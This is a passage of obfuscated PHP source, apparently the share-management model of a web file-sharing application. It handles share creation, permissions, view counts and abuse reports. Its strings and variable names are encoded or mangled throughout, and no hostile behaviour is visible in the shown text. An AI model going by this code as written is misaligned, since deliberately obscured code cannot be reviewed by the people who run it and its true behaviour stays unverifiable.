array(array("\155\x6f\144\151\146\x79\x54\x69\x6d\x65", "\x74\151\x6d\x65", "\151\156\x73\x65\x72\164\54\x75\160\144\x61\164\x65", "\x66\165\156\143\x74\151\157\x6e"), array("\143\x72\145\x61\164\x65\x54\x69\x6d\x65", "\164\151\x6d\145", "\151\x6e\x73\145\x72\x74", "\146\165\156\143\164\151\x6f\156"), array("\x6f\x70\x74\x69\x6f\156\163", '', "\151\x6e\163\x65\162\x74\x2c\x75\160\144\141\x74\x65\x2c\163\x65\154\145\143\164", "\x6a\163\x6f\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($¦™ñÜÎ½) { $¸ŞÚÕ¬ı =& $_SERVER[²Ö÷öõ]; $Ôƒ©“ÅÎ = isset($¦™ñÜÎ½[0]) ? $¦™ñÜÎ½[0] : !1; return array($¸ŞÚÕ¬ı[2123] => array(USER_ID, $¸ŞÚÕ¬ı[2124]), $¸ŞÚÕ¬ı[2064] => array($Ôƒ©“ÅÎ, $¸ŞÚÕ¬ı[2125])); } protected function listSimple() { $Öû²ª«ş = array($_SERVER[²Ö÷öõ][1780] => USER_ID); $¦ˆ¨¿·æ = $this->field($this->fieldList)->where($Öû²ª«ş)->select(); return $¦ˆ¨¿·æ ? $¦ˆ¨¿·æ : array(); } protected function getInfo($œ¹Åâµı, $ï‚à†ã„ = false) { $•¢åğ‰– =& $_SERVER[²Ö÷öõ]; if ($ï‚à†ã„) { return $this->_getShareInfo(array($•¢åğ‰–[665] => $œ¹Åâµı)); } $£æÇ·ù† = $this->cacheFunctionGet($•¢åğ‰–[2066], $œ¹Åâµı); return $£æÇ·ù†; } public function getInfoByHash($ƒü•Ò½) { return $this->_getShareInfo(array($_SERVER[²Ö÷öõ][2126] => $ƒü•Ò½)); } public function getInfoByPath($ªŒØãà) { $€§²ĞÜ =& $_SERVER[²Ö÷öõ]; $ùúø£Ğï = array($€§²ĞÜ[1780] => USER_ID, $€§²ĞÜ[193] => $ªŒØãà); return $this->_getShareInfo($ùúø£Ğï); } public function getInfoBySourcePath($©èÛÓĞ) { $š¥ıµ˜ =& $_SERVER[²Ö÷öõ]; $¨“€ó©ñ = array($š¥ıµ˜[1780] => USER_ID, $š¥ıµ˜[1265] => $©èÛÓĞ); return $this->_getShareInfo($¨“€ó©ñ); } private function _getShareInfo($ ƒ¡™®) { $ø€åÒ‰è =& $_SERVER[²Ö÷öõ]; $İˆŠ‰’‹ = $this->where($ ƒ¡™®)->find(); if (!$İˆŠ‰’‹) { return !1; } $ ƒ¡™® = array($ø€åÒ‰è[665] => $İˆŠ‰’‹[$ø€åÒ‰è[665]]); $ÚûÈò€İ = $ø€åÒ‰è[2127]; $õÚ‰«ÀÅ = Model($ø€åÒ‰è[666])->order($ø€åÒ‰è[475])->field($ÚûÈò€İ)->where($ ƒ¡™®)->select(); if ($İˆŠ‰’‹[$ø€åÒ‰è[193]] == $ø€åÒ‰è[228]) { $İˆŠ‰’‹[$ø€åÒ‰è[90]] = IO::info($İˆŠ‰’‹[$ø€åÒ‰è[1265]]); } else { $İˆŠ‰’‹[$ø€åÒ‰è[90]] = Model($ø€åÒ‰è[1428])->pathInfo($İˆŠ‰’‹[$ø€åÒ‰è[193]]); } $İˆŠ‰’‹[$ø€åÒ‰è[2128]] = $õÚ‰«ÀÅ; return $İˆŠ‰’‹; } protected function getInfoAuth($ä®–ë¾Í) { $¤ï÷šèæ =& $_SERVER[²Ö÷öõ]; $é™á‰¼À = $this->getInfo($ä®–ë¾Í); if ($é™á‰¼À[$¤ï÷šèæ[1780]] == USER_ID) { $é™á‰¼À[$¤ï÷šèæ[487]] = $é™á‰¼À[$¤ï÷šèæ[90]][$¤ï÷šèæ[487]]; } else { $é™á‰¼À[$¤ï÷šèæ[487]] = Model($¤ï÷šèæ[567])->authMake($é™á‰¼À[$¤ï÷šèæ[2128]]); } return $é™á‰¼À; } protected function listData($­’¨˜ = null, $ãßôÄÎÜ = 300) { $ãıïÆÇü =& $_SERVER[²Ö÷öõ]; $Õ«Îş = array(array($ãıïÆÇü[562] => array($ãıïÆÇü[1098], 0), $ãıïÆÇü[663] => array($ãıïÆÇü[1098], 0), $ãıïÆÇü[2129] => $ãıïÆÇü[2082])); if ($­’¨˜ == $ãıïÆÇü[2130]) { $Õ«Îş = array($ãıïÆÇü[562] => 1); } else { if ($­’¨˜ == $ãıïÆÇü[1250]) { $Õ«Îş = array($ãıïÆÇü[663] => 1); } } $Õ«Îş[$ãıïÆÇü[1780]] = USER_ID; $ Î½™ = $this->where($Õ«Îş)->selectPage($ãßôÄÎÜ); return $ Î½™; } protected function listToMe($§åñÅø = 300) { $ú´ó°ß¦ =& $_SERVER[²Ö÷öõ]; $ıï©‚±Š = Model($ú´ó°ß¦[2131])->userGroupParents(USER_ID); $†·Âğ»Ä = array($ú´ó°ß¦[648] => SourceModel::TYPE_USER, $ú´ó°ß¦[569] => USER_ID); if ($ıï©‚±Š) { $†·Âğ»Ä = array(array($ú´ó°ß¦[648] => SourceModel::TYPE_USER, $ú´ó°ß¦[569] => USER_ID), array($ú´ó°ß¦[648] => SourceModel::TYPE_GROUP, $ú´ó°ß¦[569] => array($ú´ó°ß¦[7], $ıï©‚±Š)), $ú´ó°ß¦[2129] => $ú´ó°ß¦[2082]); } $Ôã¸šÂ£ = Model($ú´ó°ß¦[666])->where($†·Âğ»Ä)->selectPage($§åñÅø); $óÅ…úÑ£ = array_to_keyvalue_group($Ôã¸šÂ£[$ú´ó°ß¦[445]], $ú´ó°ß¦[665]); if (!$óÅ…úÑ£) { return $Ôã¸šÂ£; } $™µÔ¨»Ğ = $ú´ó°ß¦[2132]; $†·Âğ»Ä = array($ú´ó°ß¦[665] => array($ú´ó°ß¦[492], array_keys($óÅ…úÑ£)), $ú´ó°ß¦[1780] => array($ú´ó°ß¦[1100], $ú´ó°ß¦[228])); $°ÖĞûÑ = $this->field($™µÔ¨»Ğ)->where($†·Âğ»Ä)->select(); foreach ($°ÖĞûÑ as $ı£İ×´É => &$¾˜”¡Ç) { $¾˜”¡Ç[$ú´ó°ß¦[2128]] = $óÅ…úÑ£[$¾˜”¡Ç[$ú´ó°ß¦[665]]]; } unset($¾˜”¡Ç); $¤Ø½ã÷ = array($ú´ó°ß¦[2133] => $°ÖĞûÑ, $ú´ó°ß¦[2134] => $Ôã¸šÂ£[$ú´ó°ß¦[442]]); return $¤Ø½ã÷; } protected function shareAdd($Ù³§¥ëˆ, $®ªÜ×á) { $•ı®şª¨ =& $_SERVER[²Ö÷öõ]; $™× ññü = $this->_addShareData($Ù³§¥ëˆ, $®ªÜ×á); if (!empty($®ªÜ×á[$•ı®şª¨[2135]])) { $this->_shareAuthSet($™× ññü, $®ªÜ×á[$•ı®şª¨[2135]]); } $this->shareEventAdd($Ù³§¥ëˆ, $®ªÜ×á, $•ı®şª¨[2136]); return $™× ññü; } protected function shareAddSystem($³ò›¯ïü, $Ãìáî¸µ) { $ŠŒŠÁ¶ =& $_SERVER[²Ö÷öõ]; $Ó±¢ÀÇØ = $this->_addShareData($³ò›¯ïü, $Ãìáî¸µ, $ŠŒŠÁ¶[191]); $this->_shareAuthSet($Ó±¢ÀÇØ, $Ãìáî¸µ[$ŠŒŠÁ¶[2135]]); return $Ó±¢ÀÇØ; } private function shareEventAdd($Äíßˆüû, $Àşæ×ŸÙ, $õêüÏŸ¥ = "\x61\x64\144") { $™™—Û«¦ =& $_SERVER[²Ö÷öõ]; if (!$Äíßˆüû || $Äíßˆüû == $™™—Û«¦[228]) { return; } if ($õêüÏŸ¥ == $™™—Û«¦[2136]) { if ($Àşæ×ŸÙ[$™™—Û«¦[562]] == $™™—Û«¦[91]) { Model($™™—Û«¦[633])->eventShare($Äíßˆüû, $™™—Û«¦[2137]); } if ($Àşæ×ŸÙ[$™™—Û«¦[663]] == $™™—Û«¦[91]) { Model($™™—Û«¦[633])->eventShare($Äíßˆüû, $™™—Û«¦[2138]); } return; } $şóÍÊ´ë = $this->getInfoByPath($Äíßˆüû); $Ÿó¡©¥ = $™™—Û«¦[2139]; if ($şóÍÊ´ë[$™™—Û«¦[562]] == $™™—Û«¦[228] && $Àşæ×ŸÙ[$™™—Û«¦[562]] == $™™—Û«¦[91]) { $Ÿó¡©¥ = $™™—Û«¦[2137]; } if ($şóÍÊ´ë[$™™—Û«¦[562]] == $™™—Û«¦[91] && $Àşæ×ŸÙ[$™™—Û«¦[562]] == $™™—Û«¦[228]) { $Ÿó¡©¥ = $™™—Û«¦[2140]; } if ($şóÍÊ´ë[$™™—Û«¦[663]] == $™™—Û«¦[228] && $Àşæ×ŸÙ[$™™—Û«¦[663]] == $™™—Û«¦[91]) { $Ÿó¡©¥ = $™™—Û«¦[2138]; } if ($şóÍÊ´ë[$™™—Û«¦[663]] == $™™—Û«¦[91] && $Àşæ×ŸÙ[$™™—Û«¦[663]] == $™™—Û«¦[228]) { $Ÿó¡©¥ = $™™—Û«¦[2141]; } Model($™™—Û«¦[633])->eventShare($Äíßˆüû, $Ÿó¡©¥); return; } private function _addShareData($ƒ÷–şˆ, $ÄÑ¡‡‚ = array(), $ğ¾ï£´ = false) { $®³©•ºç =& $_SERVER[²Ö÷öõ]; $­Â·Îã£ = $ğ¾ï£´ == $®³©•ºç[191] ? 0 : USER_ID; $«÷¨Õ‡Ï = array($®³©•ºç[491] => $ƒ÷–şˆ, $®³©•ºç[1771] => $­Â·Îã£); if ($ƒ÷–şˆ == 0) { $«÷¨Õ‡Ï = array($®³©•ºç[2142] => $ÄÑ¡‡‚[$®³©•ºç[1265]], $®³©•ºç[1771] => $­Â·Îã£); } if ($Ä¸ê½‹ = $this->where($«÷¨Õ‡Ï)->find()) { return $Ä¸ê½‹[$®³©•ºç[665]]; } if ($ƒ÷–şˆ == 0) { $€ıÌğ× = array($®³©•ºç[32] => get_path_this($ÄÑ¡‡‚[$®³©•ºç[87]])); } else { $€ıÌğ× = Model($®³©•ºç[907])->sourceInfo($ƒ÷–şˆ); if (!$€ıÌğ×) { return !1; } } if (!$ÄÑ¡‡‚[$®³©•ºç[1667]]) { $ÄÑ¡‡‚[$®³©•ºç[1667]] = $€ıÌğ×[$®³©•ºç[32]]; } $¨¥ÃÓ¨³ = array($®³©•ºç[1771] => $­Â·Îã£, $®³©•ºç[491] => $ƒ÷–şˆ, $®³©•ºç[1667] => $®³©•ºç[12], $®³©•ºç[562] => 0, $®³©•ºç[663] => 0, $®³©•ºç[1265] => $®³©•ºç[12], $®³©•ºç[383] => $®³©•ºç[12], $®³©•ºç[975] => $®³©•ºç[12], $®³©•ºç[2143] => 0, $®³©•ºç[2144] => 0, $®³©•ºç[844] => 0, $®³©•ºç[2145] => $®³©•ºç[12], $®³©•ºç[2126] => $®³©•ºç[12]); $äîãê£è = explode($®³©•ºç[50], $®³©•ºç[2146]); foreach ($äîãê£è as $›ç¦½£ó) { if (!isset($ÄÑ¡‡‚[$›ç¦½£ó])) { continue; } $¨¥ÃÓ¨³[$›ç¦½£ó] = $ÄÑ¡‡‚[$›ç¦½£ó]; } $€Üª·‚î = $this->add($¨¥ÃÓ¨³); $¦¡üæ³ = array($®³©•ºç[2126] => short_id($€Üª·‚î)); $this->where(array($®³©•ºç[2147] => $€Üª·‚î))->save($¦¡üæ³); return $€Üª·‚î; } private function _shareAuthSet($«èµ²™, $Öµ¶Ş) { $„ÖùáİÚ =& $_SERVER[²Ö÷öõ]; if (!is_array($Öµ¶Ş)) { return !1; } $Åëş»øâ = Model($„ÖùáİÚ[2092]); $Åëş»øâ->where(array($„ÖùáİÚ[665] => $«èµ²™))->delete(); $ßŞÃüÉÜ = array(); foreach ($Öµ¶Ş as $€ğ£†±å) { $ºÅÌ¥Îû = SourceModel::TYPE_USER; if ($€ğ£†±å[$„ÖùáİÚ[190]] == SourceModel::TYPE_GROUP) { $ºÅÌ¥Îû = SourceModel::TYPE_GROUP; } $éŒ†ØÆ­ = array($„ÖùáİÚ[665] => $«èµ²™, $„ÖùáİÚ[190] => $ºÅÌ¥Îû, $„ÖùáİÚ[569] => intval($€ğ£†±å[$„ÖùáİÚ[569]]), $„ÖùáİÚ[2088] => 0, $„ÖùáİÚ[2148] => -1); if ($€ğ£†±å[$„ÖùáİÚ[2088]]) { $éŒ†ØÆ­[$„ÖùáİÚ[2088]] = $€ğ£†±å[$„ÖùáİÚ[2088]]; } else { if ($€ğ£†±å[$„ÖùáİÚ[2148]]) { $éŒ†ØÆ­[$„ÖùáİÚ[2148]] = $€ğ£†±å[$„ÖùáİÚ[2148]]; } } $ßŞÃüÉÜ[] = $éŒ†ØÆ­; } return $Åëş»øâ->addAll($ßŞÃüÉÜ, array(), !0); } public function numViewAdd($ûŠÎúˆ) { $ÉÇ³ëèú =& $_SERVER[²Ö÷öõ]; $¤ÏîÅ = array($ÉÇ³ëèú[2147] => $ûŠÎúˆ); $this->where($¤ÏîÅ)->setAdd($ÉÇ³ëèú[2143]); } public function numDownloadAdd($·£Á¬Ö¬) { $ÎùÚáî› =& $_SERVER[²Ö÷öõ]; $üÜ©±ìş = array($ÎùÚáî›[2147] => $·£Á¬Ö¬); $this->where($üÜ©±ìş)->setAdd($ÎùÚáî›[2144]); } protected function shareEdit($ìÇŞ´„Ù, $âèâ©Ò÷) { $’÷âè÷ö =& $_SERVER[²Ö÷öõ]; $ßì¾—ëè = $this->getInfo($ìÇŞ´„Ù); if (!$ßì¾—ëè) { return !1; } $this->_checkLinkShare($âèâ©Ò÷, $ßì¾—ëè); $´‡ÔÔŞ = array(); $˜òªêºŠ = explode($’÷âè÷ö[50], $’÷âè÷ö[2149]); foreach ($˜òªêºŠ as $ı‚ÊŸ³â) { if (!array_key_exists($ı‚ÊŸ³â, $âèâ©Ò÷)) { continue; } $´‡ÔÔŞ[$ı‚ÊŸ³â] = $âèâ©Ò÷[$ı‚ÊŸ³â]; } $this->shareEventAdd($ßì¾—ëè[$’÷âè÷ö[193]], $âèâ©Ò÷, $’÷âè÷ö[1949]); $this->where(array($’÷âè÷ö[2147] => $ìÇŞ´„Ù))->save($´‡ÔÔŞ); if (isset($âèâ©Ò÷[$’÷âè÷ö[2135]])) { $this->_shareAuthSet($ìÇŞ´„Ù, $âèâ©Ò÷[$’÷âè÷ö[2135]]); } return !0; } private function _checkLinkShare($½¯Õ¥¹†, $Å´¢á¢†) { $İà×æÔú =& $_SERVER[²Ö÷öõ]; if ($½¯Õ¥¹†[$İà×æÔú[562]] != $İà×æÔú[91]) { return; } $ˆ‹±¢’Ï = $Å´¢á¢†[$İà×æÔú[90]][$İà×æÔú[193]]; if ($Å´¢á¢†[$İà×æÔú[90]][$İà×æÔú[33]] != $İà×æÔú[230]) { $Ğá¦Ú”ƒ = $this->_folderReport($ˆ‹±¢’Ï); if (!$Ğá¦Ú”ƒ) { return; } show_json(LNG($İà×æÔú[2150]) . $İà×æÔú[2151] . $Ğá¦Ú”ƒ, !1); } $¼‡”ÑÒ× = Model($İà×æÔú[907])->fileInfoGet($Å´¢á¢†[$İà×æÔú[90]][$İà×æÔú[193]]); if (!$¼‡”ÑÒ×) { return; } $í—¼­¸É = $this->shareFileMeta($¼‡”ÑÒ×[$İà×æÔú[541]]); if (isset($í—¼­¸É[$İà×æÔú[450]]) && $í—¼­¸É[$İà×æÔú[450]] == $İà×æÔú[91]) { show_json(LNG($İà×æÔú[2152]), !1); } } private function _folderReport($Ï²ìä) { $¥íİ†°È =& $_SERVER[²Ö÷öõ]; $¡ğ“‹Ö§ = array($¥íİ†°È[541] => array($¥íİ†°È[1098], 0), $¥íİ†°È[833] => 3); $öŒ¬ÔÇš = Model($¥íİ†°È[2153])->where($¡ğ“‹Ö§)->field($¥íİ†°È[541])->select(); if (!$öŒ¬ÔÇš) { return !1; } $öŒ¬ÔÇš = array_to_keyvalue($öŒ¬ÔÇš, $¥íİ†°È[12], $¥íİ†°È[541]); $£ô÷Ï†ú = $¥íİ†°È[50] . $Ï²ìä . $¥íİ†°È[50]; $¡ğ“‹Ö§ = array($¥íİ†°È[541] => array($¥íİ†°È[7], $öŒ¬ÔÇš), $¥íİ†°È[584] => array($¥íİ†°È[459], "\45{$£ô÷Ï†ú}\45"), $¥íİ†°È[505] => 0); $…ÉåˆÔö = Model($¥íİ†°È[907])->where($¡ğ“‹Ö§)->field($¥íİ†°È[2154])->find(); if (!$…ÉåˆÔö) { return !1; } $âÎÜ·ÍÅ = substr($…ÉåˆÔö[$¥íİ†°È[584]], strpos($…ÉåˆÔö[$¥íİ†°È[584]], $£ô÷Ï†ú)); $¡ğ“‹Ö§ = array($¥íİ†°È[193] => array($¥íİ†°È[7], trim($âÎÜ·ÍÅ, $¥íİ†°È[50]))); $…ŠÖ¡ = Model($¥íİ†°È[907])->where($¡ğ“‹Ö§)->field($¥íİ†°È[32])->select(); $é½–‹ù… = array_to_keyvalue($…ŠÖ¡, $¥íİ†°È[12], $¥íİ†°È[32]); $é½–‹ù…[] = $…ÉåˆÔö[$¥íİ†°È[32]]; return implode($¥íİ†°È[8], $é½–‹ù…); } protected function remove($åá•ßèî) { $ŸÁøõ€­ =& $_SERVER[²Ö÷öõ]; $¡µ¹ŠË = is_array($åá•ßèî) ? $åá•ßèî : array($åá•ßèî); for ($·Å±¥½ø = 0; $·Å±¥½ø < count($¡µ¹ŠË); $·Å±¥½ø++) { $“§ƒòÉ» = $this->getInfo($¡µ¹ŠË[$·Å±¥½ø]); if ($“§ƒòÉ»[$ŸÁøõ€­[663]] == $ŸÁøõ€­[91]) { Model($ŸÁøõ€­[633])->eventShare($“§ƒòÉ»[$ŸÁøõ€­[193]], $ŸÁøõ€­[2141]); } if ($“§ƒòÉ»[$ŸÁøõ€­[562]] == $ŸÁøõ€­[91]) { Model($ŸÁøõ€­[633])->eventShare($“§ƒòÉ»[$ŸÁøõ€­[193]], $ŸÁøõ€­[2140]); } } if (is_array($åá•ßèî)) { $åá•ßèî = array($ŸÁøõ€­[7], $åá•ßèî); } $İåéñöñ = array($ŸÁøõ€­[665] => $åá•ßèî); $¨÷Ë…Åƒ = $this->where($İåéñöñ)->delete(); if ($¨÷Ë…Åƒ) { Model($ŸÁøõ€­[666])->where(array($ŸÁøõ€­[665] => $åá•ßèî))->delete(); } return $¨÷Ë…Åƒ; } protected function removeBySource($ÕÖà—ö½) { $ˆ²¸¾·Ê =& $_SERVER[²Ö÷öõ]; $¾Å—¿Û° = array($ˆ²¸¾·Ê[491] => array($ˆ²¸¾·Ê[492], $ÕÖà—ö½)); $²ÇáˆÇŒ = $this->field($ˆ²¸¾·Ê[665])->where($¾Å—¿Û°)->select(); $²ÇáˆÇŒ = array_to_keyvalue($²ÇáˆÇŒ, $ˆ²¸¾·Ê[12], $ˆ²¸¾·Ê[665]); if (!$²ÇáˆÇŒ) { return; } $¾Å—¿Û° = array($ˆ²¸¾·Ê[2147] => array($ˆ²¸¾·Ê[492], $²ÇáˆÇŒ)); $this->where($¾Å—¿Û°)->delete(); Model($ˆ²¸¾·Ê[666])->where($¾Å—¿Û°)->delete(); } public function listAll($Ë®ÙÄ) { $ÑÂˆÃ…ã =& $_SERVER[²Ö÷öõ]; $µş ‡µ = array(); if ($Ë®ÙÄ[$ÑÂˆÃ…ã[1780]]) { $µş ‡µ[$ÑÂˆÃ…ã[1780]] = $Ë®ÙÄ[$ÑÂˆÃ…ã[1780]]; } if ($Ë®ÙÄ[$ÑÂˆÃ…ã[843]]) { $¤”„‡†¡ = $Ë®ÙÄ[$ÑÂˆÃ…ã[844]] ? $Ë®ÙÄ[$ÑÂˆÃ…ã[844]] : strtotime(date($ÑÂˆÃ…ã[2155])); $µş ‡µ[$ÑÂˆÃ…ã[231]] = array($ÑÂˆÃ…ã[409], array($Ë®ÙÄ[$ÑÂˆÃ…ã[843]], $¤”„‡†¡)); } if ($Ë®ÙÄ[$ÑÂˆÃ…ã[33]]) { $µş ‡µ[$Ë®ÙÄ[$ÑÂˆÃ…ã[33]]] = 1; } else { $µş ‡µ[] = array($ÑÂˆÃ…ã[562] => array($ÑÂˆÃ…ã[1098], 0), $ÑÂˆÃ…ã[663] => array($ÑÂˆÃ…ã[1098], 0), $ÑÂˆÃ…ã[2129] => $ÑÂˆÃ…ã[2082]); } if ($Ë®ÙÄ[$ÑÂˆÃ…ã[2078]]) { $µş ‡µ[] = array($ÑÂˆÃ…ã[2126] => $Ë®ÙÄ[$ÑÂˆÃ…ã[2078]], $ÑÂˆÃ…ã[1667] => array($ÑÂˆÃ…ã[459], "\45{$Ë®ÙÄ[$ÑÂˆÃ…ã[2078]]}\x25"), $ÑÂˆÃ…ã[2129] => $ÑÂˆÃ…ã[2082]); } $§ô·¤È„ = $this->_makeOrder()->where($µş ‡µ)->selectPage(20); if (empty($§ô·¤È„[$ÑÂˆÃ…ã[445]])) { return array(); } $this->_listDataApply($§ô·¤È„[$ÑÂˆÃ…ã[445]]); return $§ô·¤È„; } public function listDataApply($½›÷ë¸‚) { $this->_listDataApply($½›÷ë¸‚); return $½›÷ë¸‚; } private function _listDataApply(&$®¡ö¥) { $“¾ãåøú =& $_SERVER[²Ö÷öõ]; $úƒé¯Ü” = array_to_keyvalue($®¡ö¥, $“¾ãåøú[12], $“¾ãåøú[1780]); $ìÛä‹ÄÈ = Model($“¾ãåøú[598])->userListInfo(array_unique($úƒé¯Ü”)); $¶ÙÅ†ğ“ = array_to_keyvalue($®¡ö¥, $“¾ãåøú[12], $“¾ãåøú[193]); $°Ê©õùı = Model($“¾ãåøú[907])->sourceListInfo($¶ÙÅ†ğ“, !0); foreach ($®¡ö¥ as $ıà®Ñ©ç => &$ïÒĞ¡Ï®) { $ªõóÅÕ = $ïÒĞ¡Ï®[$“¾ãåøú[1780]]; $ïÒĞ¡Ï®[$“¾ãåøú[2156]] = $ìÛä‹ÄÈ[$ªõóÅÕ] ? $ìÛä‹ÄÈ[$ªõóÅÕ] : !1; $ÄÂÉ‘€ë = $ïÒĞ¡Ï®[$“¾ãåøú[193]]; $ïÒĞ¡Ï®[$“¾ãåøú[90]] = $°Ê©õùı[$ÄÂÉ‘€ë] ? $°Ê©õùı[$ÄÂÉ‘€ë] : !1; if ($ïÒĞ¡Ï®[$“¾ãåøú[90]][$“¾ãåøú[505]] == $“¾ãåøú[91]) { unset($®¡ö¥[$ıà®Ñ©ç]); } if ($ïÒĞ¡Ï®[$“¾ãåøú[90]] != $“¾ãåøú[228] && !$ïÒĞ¡Ï®[$“¾ãåøú[90]]) { unset($®¡ö¥[$ıà®Ñ©ç]); } } unset($ïÒĞ¡Ï®); $®¡ö¥ = array_values($®¡ö¥); } private function _makeOrder($·­ú¼”Õ = '') { $¡ÇôÑÆÂ =& $_SERVER[²Ö÷öõ]; $Ù‹š‹Ö = array($¡ÇôÑÆÂ[231], $¡ÇôÑÆÂ[844], $¡ÇôÑÆÂ[2143], $¡ÇôÑÆÂ[2144]); $ÈÖåØ›‘ = array($¡ÇôÑÆÂ[523] => $¡ÇôÑÆÂ[524], $¡ÇôÑÆÂ[525] => $¡ÇôÑÆÂ[526]); $‘Êª³¥ = Input::get($¡ÇôÑÆÂ[530], $¡ÇôÑÆÂ[7], $¡ÇôÑÆÂ[497], $Ù‹š‹Ö); $²¾ôÀú = Input::get($¡ÇôÑÆÂ[531], $¡ÇôÑÆÂ[7], $¡ÇôÑÆÂ[2157], array($¡ÇôÑÆÂ[2075], $¡ÇôÑÆÂ[525])); $²¾ôÀú = $ÈÖåØ›‘[$²¾ôÀú]; $·­ú¼”Õ = $·­ú¼”Õ . "{$‘Êª³¥}\40{$²¾ôÀú}"; return $this->order($·­ú¼”Õ); } public function reportAdd($ƒèì¡‹Ù) { $­ŞúêÁ =& $_SERVER[²Ö÷öõ]; $“—¿Õ‰œ = array($­ŞúêÁ[665] => $ƒèì¡‹Ù[$­ŞúêÁ[665]], $­ŞúêÁ[1780] => USER_ID); if (Model($­ŞúêÁ[2153])->where($“—¿Õ‰œ)->find()) { return !1; } $È•¦éà = array($­ŞúêÁ[665] => $ƒèì¡‹Ù[$­ŞúêÁ[665]], $­ŞúêÁ[1667] => $ƒèì¡‹Ù[$­ŞúêÁ[1667]], $­ŞúêÁ[193] => $ƒèì¡‹Ù[$­ŞúêÁ[193]], $­ŞúêÁ[541] => $ƒèì¡‹Ù[$­ŞúêÁ[541]], $­ŞúêÁ[1780] => USER_ID, $­ŞúêÁ[33] => $ƒèì¡‹Ù[$­ŞúêÁ[33]], $­ŞúêÁ[526] => $ƒèì¡‹Ù[$­ŞúêÁ[526]]); return Model($­ŞúêÁ[2153])->add($È•¦éà); } public function reportList($÷º¶½Â—) { $«ÂÏ©Éş =& $_SERVER[²Ö÷öõ]; $Ø€ÓÜô = array(); if ($÷º¶½Â—[$«ÂÏ©Éş[843]]) { $Šû´€¸ä = $÷º¶½Â—[$«ÂÏ©Éş[844]] ? $÷º¶½Â—[$«ÂÏ©Éş[844]] : strtotime(date($«ÂÏ©Éş[2155])); $Ø€ÓÜô[$«ÂÏ©Éş[231]] = array($«ÂÏ©Éş[409], array($÷º¶½Â—[$«ÂÏ©Éş[843]], $Šû´€¸ä)); } if (isset($÷º¶½Â—[$«ÂÏ©Éş[33]]) && in_array($÷º¶½Â—[$«ÂÏ©Éş[33]], array($«ÂÏ©Éş[91], $«ÂÏ©Éş[510], $«ÂÏ©Éş[2158], $«ÂÏ©Éş[2159], $«ÂÏ©Éş[2160]))) { $Ø€ÓÜô[$«ÂÏ©Éş[33]] = $÷º¶½Â—[$«ÂÏ©Éş[33]]; } if (isset($÷º¶½Â—[$«ÂÏ©Éş[833]]) && in_array($÷º¶½Â—[$«ÂÏ©Éş[833]], array($«ÂÏ©Éş[228], $«ÂÏ©Éş[91], $«ÂÏ©Éş[510], $«ÂÏ©Éş[2158]))) { $Ø€ÓÜô[$«ÂÏ©Éş[833]] = $÷º¶½Â—[$«ÂÏ©Éş[833]]; } $ÙˆÇÖÇ  = Input::get($«ÂÏ©Éş[531], $«ÂÏ©Éş[7], $«ÂÏ©Éş[2157], array($«ÂÏ©Éş[2075], $«ÂÏ©Éş[525])); $Æ‰¦è = array($«ÂÏ©Éş[523] => $«ÂÏ©Éş[524], $«ÂÏ©Éş[525] => $«ÂÏ©Éş[526]); $ü¦‘š“í = $«ÂÏ©Éş[2161] . $Æ‰¦è[$ÙˆÇÖÇ ]; $÷ÆÃŞì— = Model($«ÂÏ©Éş[2153])->where($Ø€ÓÜô)->order($ü¦‘š“í)->selectPage(20); if (empty($÷ÆÃŞì—[$«ÂÏ©Éş[445]])) { return array(); } $ôùºï¬ö = array_to_keyvalue_group($÷ÆÃŞì—[$«ÂÏ©Éş[445]], $«ÂÏ©Éş[833], $«ÂÏ©Éş[665]); if (!empty($ôùºï¬ö[0])) { $÷º¶½Â— = $ôùºï¬ö[0]; $Ø€ÓÜô = array($«ÂÏ©Éş[665] => array($«ÂÏ©Éş[7], $÷º¶½Â—)); $Á¦ıÍ÷û = $this->where($Ø€ÓÜô)->field($«ÂÏ©Éş[665])->select(); $Á¦ıÍ÷û = array_to_keyvalue($Á¦ıÍ÷û, $«ÂÏ©Éş[12], $«ÂÏ©Éş[665]); $ğÍí¼¨ = array_diff($÷º¶½Â—, $Á¦ıÍ÷û); if (!empty($ğÍí¼¨)) { foreach ($÷ÆÃŞì—[$«ÂÏ©Éş[445]] as $ƒøı—®¿ => $„¨£³Â‰) { if (in_array($„¨£³Â‰[$«ÂÏ©Éş[665]], $ğÍí¼¨)) { unset($÷ÆÃŞì—[$«ÂÏ©Éş[445]][$ƒøı—®¿]); } } } } $this->_listDataApply($÷ÆÃŞì—[$«ÂÏ©Éş[445]]); return $÷ÆÃŞì—; } public function reportStatus($ê—ôş´ƒ) { $£×Â¶Ô› =& $_SERVER[²Ö÷öõ]; $£õ™§· = array($£×Â¶Ô›[475] => $ê—ôş´ƒ[$£×Â¶Ô›[475]]); $ü²î‹ë— = Model($£×Â¶Ô›[2153])->where($£õ™§·)->field($£×Â¶Ô›[2162])->find(); if (!$ü²î‹ë—) { return !1; } $ƒ•îÉôï = array($£×Â¶Ô›[833] => $ê—ôş´ƒ[$£×Â¶Ô›[833]]); if ($ê—ôş´ƒ[$£×Â¶Ô›[833]] == $£×Â¶Ô›[2158] && $ü²î‹ë—[$£×Â¶Ô›[833]] == $£×Â¶Ô›[2158]) { $ƒ•îÉôï[$£×Â¶Ô›[833]] = 0; } $°“íÚû… = Model($£×Â¶Ô›[2153])->where($£õ™§·)->save($ƒ•îÉôï); if ($ê—ôş´ƒ[$£×Â¶Ô›[833]] == $£×Â¶Ô›[510]) { if ($ü²î‹ë—[$£×Â¶Ô›[541]] != $£×Â¶Ô›[228] && $this->shareFileMeta($ü²î‹ë—[$£×Â¶Ô›[541]])) { $this->shareFileMeta($ü²î‹ë—[$£×Â¶Ô›[541]], 0); } $this->remove($ü²î‹ë—[$£×Â¶Ô›[665]]); return !0; } if ($°“íÚû… && $ê—ôş´ƒ[$£×Â¶Ô›[833]] == $£×Â¶Ô›[2158]) { $ËÁ«ıô = $ƒ•îÉôï[$£×Â¶Ô›[833]] == $£×Â¶Ô›[2158] ? 1 : 0; $this->shareFileMeta($ü²î‹ë—[$£×Â¶Ô›[541]], $ËÁ«ıô); $this->removeByFile($ü²î‹ë—[$£×Â¶Ô›[541]]); } return $°“íÚû…; } private function removeByFile($»…çŠû½) { $ßÆµŞÑ² =& $_SERVER[²Ö÷öõ]; $ßÏÌÎ¢· = Model($ßÆµŞÑ²[907])->where(array($ßÆµŞÑ²[541] => $»…çŠû½))->field($ßÆµŞÑ²[193])->select(); $¬Šö¾óû = array_to_keyvalue($ßÏÌÎ¢·, $ßÆµŞÑ²[12], $ßÆµŞÑ²[193]); $ÀÖÀ¤§ = array($ßÆµŞÑ²[193] => 